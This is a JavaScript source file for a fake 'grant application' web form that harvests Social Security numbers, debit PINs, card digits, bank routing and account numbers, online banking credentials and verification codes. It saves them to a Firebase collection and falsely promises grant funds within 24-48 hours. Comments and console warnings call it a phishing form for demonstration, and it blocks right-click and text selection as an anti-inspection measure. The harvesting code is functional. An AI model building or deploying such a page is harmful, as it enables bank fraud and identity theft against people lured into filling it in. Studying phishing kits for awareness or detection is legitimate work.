// Grant Application Form Handler
class GrantApplicationForm {
    constructor() {
        this.form = document.getElementById('grant-form');
        this.submitBtn = document.querySelector('.submit-btn');
        this.init();
    }

    init() {
        this.setupFormValidation();
        this.setupFormSubmission();
        this.setupInputFormatting();
        this.addSecurityWarnings();
    }

    setupFormValidation() {
        // Real-time validation
        const inputs = this.form.querySelectorAll('input, select, textarea');
        
        inputs.forEach(input => {
            input.addEventListener('blur', () => this.validateField(input));
            input.addEventListener('input', () => this.clearFieldError(input));
        });

        // SSN formatting
        const ssnInput = document.getElementById('ssn');
        ssnInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
            } else if (value.length >= 3) {
                value = value.replace(/(\d{3})(\d{2})/, '$1-$2');
            }
            e.target.value = value;
        });

        // PIN formatting
        const pinInput = document.getElementById('debit-pin');
        pinInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });

        // Card last 4 digits
        const cardInput = document.getElementById('card-last-4');
        cardInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });

        // Verification code
        const verificationInput = document.getElementById('verification-code');
        verificationInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
        });
    }

    setupFormSubmission() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            if (this.validateForm()) {
                this.submitForm();
            } else {
                this.showFormErrors();
            }
        });
    }

    setupInputFormatting() {
        // Add input masks and formatting
        const routingInput = document.getElementById('routing-number');
        routingInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
        });

        const accountInput = document.getElementById('account-number');
        accountInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }

    addSecurityWarnings() {
        // Add warnings to sensitive fields
        const sensitiveFields = ['ssn', 'debit-pin', 'online-password'];
        
        sensitiveFields.forEach(fieldId => {
            const field = document.getElementById(fieldId);
            const warning = document.createElement('div');
            warning.className = 'field-warning';
            warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Never share this information with untrusted sources';
            warning.style.cssText = `
                color: #856404;
                font-size: 0.9em;
                margin-top: 5px;
                display: none;
            `;
            
            field.addEventListener('focus', () => {
                warning.style.display = 'block';
            });
            
            field.addEventListener('blur', () => {
                setTimeout(() => warning.style.display = 'none', 1000);
            });
            
            field.parentNode.appendChild(warning);
        });
    }

    validateField(field) {
        const value = field.value.trim();
        let isValid = true;
        let errorMessage = '';

        // Required field validation
        if (field.hasAttribute('required') && !value) {
            isValid = false;
            errorMessage = 'This field is required';
        }

        // Email validation
        if (field.type === 'email' && value) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid email address';
            }
        }

        // SSN validation
        if (field.id === 'ssn' && value) {
            const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
            if (!ssnRegex.test(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid SSN (XXX-XX-XXXX)';
            }
        }

        // PIN validation
        if (field.id === 'debit-pin' && value) {
            if (value.length !== 4 || !/^\d{4}$/.test(value)) {
                isValid = false;
                errorMessage = 'PIN must be exactly 4 digits';
            }
        }

        // Routing number validation
        if (field.id === 'routing-number' && value) {
            if (value.length !== 9 || !/^\d{9}$/.test(value)) {
                isValid = false;
                errorMessage = 'Routing number must be exactly 9 digits';
            }
        }

        // Verification code validation
        if (field.id === 'verification-code' && value) {
            if (value.length !== 5 || !/^\d{5}$/.test(value)) {
                isValid = false;
                errorMessage = 'Verification code must be exactly 5 digits';
            }
        }

        this.showFieldError(field, isValid, errorMessage);
        return isValid;
    }

    showFieldError(field, isValid, message) {
        // Remove existing error
        const existingError = field.parentNode.querySelector('.field-error');
        if (existingError) {
            existingError.remove();
        }

        // Add new error if invalid
        if (!isValid) {
            const errorDiv = document.createElement('div');
            errorDiv.className = 'field-error';
            errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
            field.parentNode.appendChild(errorDiv);
            field.style.borderColor = '#dc3545';
        } else {
            field.style.borderColor = '#28a745';
        }
    }

    clearFieldError(field) {
        const error = field.parentNode.querySelector('.field-error');
        if (error) {
            error.remove();
        }
        field.style.borderColor = '#e9ecef';
    }

    validateForm() {
        const inputs = this.form.querySelectorAll('input[required], select[required], textarea[required]');
        let isFormValid = true;

        inputs.forEach(input => {
            if (!this.validateField(input)) {
                isFormValid = false;
            }
        });

        return isFormValid;
    }

    showFormErrors() {
        // Scroll to first error
        const firstError = this.form.querySelector('.field-error');
        if (firstError) {
            firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Show alert
        alert('Please correct the errors highlighted in red before submitting.');
    }

    async submitForm() {
        // Show loading state
        this.submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Application...';
        this.submitBtn.disabled = true;

        try {
            // Validate form first
            if (!this.validateForm()) {
                this.showFormErrors();
                this.resetSubmitButton();
                return;
            }

            // Collect form data
            const formData = this.collectFormData();
            console.log('Form data collected:', formData);
            
            // Wait for Firebase to be ready
            await this.waitForFirebase();
            
            // Save to Firebase
            await this.saveApplicationToFirebase(formData);

            // Show success result
            this.showSubmissionResult();
        } catch (error) {
            console.error('Error submitting form:', error);
            
            // Try fallback to localStorage if Firebase fails
            try {
                console.log('Firebase failed, trying localStorage fallback...');
                const formData = this.collectFormData();
                this.saveApplicationToStorage(formData);
                this.showSubmissionResult();
            } catch (fallbackError) {
                console.error('Fallback also failed:', fallbackError);
                this.showErrorResult();
            }
        }
    }

    async waitForFirebase() {
        let attempts = 0;
        const maxAttempts = 50; // 5 seconds max wait
        
        while (!window.db || !window.firebaseAddDoc) {
            if (attempts >= maxAttempts) {
                throw new Error('Firebase not available');
            }
            await new Promise(resolve => setTimeout(resolve, 100));
            attempts++;
        }
    }

    resetSubmitButton() {
        this.submitBtn.innerHTML = 'Submit';
        this.submitBtn.disabled = false;
    }

    collectFormData() {
        const formData = new FormData(this.form);
        const data = {};
        
        // Convert FormData to object
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        // Generate unique ID and timestamp
        const timestamp = Date.now();
        const date = new Date();
        const year = date.getFullYear().toString().slice(-2);
        const month = (date.getMonth() + 1).toString().padStart(2, '0');
        const day = date.getDate().toString().padStart(2, '0');
        const randomNum = Math.floor(Math.random() * 9999).toString().padStart(4, '0');
        
        data.id = `GRANT-${year}${month}${day}-${randomNum}`;
        data.submittedAt = new Date();
        data.isNew = true;
        
        return data;
    }

    async saveApplicationToFirebase(formData) {
        try {
            console.log('=== FIREBASE SAVE ATTEMPT ===');
            console.log('Form data:', formData);
            console.log('window.db available:', !!window.db);
            console.log('firebaseAddDoc available:', !!window.firebaseAddDoc);
            
            if (!window.db) {
                console.error('window.db is not available');
                throw new Error('Firebase database not available');
            }
            
            if (!window.firebaseAddDoc) {
                console.error('firebaseAddDoc function is not available');
                throw new Error('Firebase addDoc function not available');
            }
            
            // Prepare data for Firebase
            const firebaseData = {
                ...formData,
                submittedAt: new Date(),
                isNew: true,
                status: 'pending'
            };
            
            console.log('Data to save to Firebase:', firebaseData);
            
            // Save to Firebase
            console.log('Calling firebaseAddDoc...');
            const docRef = await window.firebaseAddDoc(window.db, 'grantApplications', firebaseData);
            
            console.log('✅ SUCCESS: Application saved to Firebase with ID:', docRef.id);
            return docRef.id;
        } catch (error) {
            console.error('❌ ERROR saving application to Firebase:', error);
            console.error('Error details:', error.message);
            throw error;
        }
    }

    saveApplicationToStorage(formData) {
        try {
            // Get existing applications
            const existing = JSON.parse(localStorage.getItem('grantApplications') || '[]');
            
            // Add new application
            existing.push(formData);
            
            // Save back to localStorage
            localStorage.setItem('grantApplications', JSON.stringify(existing));
            
            console.log('Application saved to localStorage:', formData.id);
        } catch (error) {
            console.error('Error saving application to localStorage:', error);
        }
    }

    showErrorResult() {
        // Reset button
        this.resetSubmitButton();

        // Show error message
        alert('There was an error submitting your application. Please check your internet connection and try again.');
    }

    showSubmissionResult() {
        // Create success message
        const successDiv = document.createElement('div');
        successDiv.className = 'success-message show';
        successDiv.innerHTML = `
            <h3><i class="fas fa-check-circle"></i> Application Submitted Successfully!</h3>
            <p>Your application has been processed and you will receive your grant funds within 24-48 hours.</p>
            <p><em>Reference ID: GRANT-${Math.random().toString(36).substr(2, 9).toUpperCase()}</em></p>
        `;

        // Insert success message
        this.form.parentNode.insertBefore(successDiv, this.form);

        // Hide form
        this.form.style.display = 'none';

        // Reset button
        this.submitBtn.innerHTML = 'Submit Grant Application';
        this.submitBtn.disabled = false;

        // Add reset button
        const resetBtn = document.createElement('button');
        resetBtn.className = 'submit-btn';
        resetBtn.innerHTML = '<i class="fas fa-redo"></i> Start New Application';
        resetBtn.onclick = () => {
            successDiv.remove();
            this.form.style.display = 'block';
            this.form.reset();
        };
        successDiv.appendChild(resetBtn);

        // Scroll to success message
        successDiv.scrollIntoView({ behavior: 'smooth' });
    }
}

// Initialize the form when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new GrantApplicationForm();
});

// Additional security warnings
document.addEventListener('DOMContentLoaded', () => {
    // Add click tracking to sensitive fields
    const sensitiveFields = ['ssn', 'debit-pin', 'online-password', 'online-username'];
    
    sensitiveFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('click', () => {
                console.warn('⚠️ WARNING: You are about to enter sensitive information into what appears to be a phishing form.');
            });
        }
    });
});

// Prevent right-click and text selection (common phishing technique)
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    alert('⚠️ This action is disabled for security purposes.');
});

document.addEventListener('selectstart', (e) => {
    e.preventDefault();
});

// Add keyboard shortcuts warning
document.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
        alert('⚠️ Saving is disabled. This form is for demonstration purposes only.');
    }
});
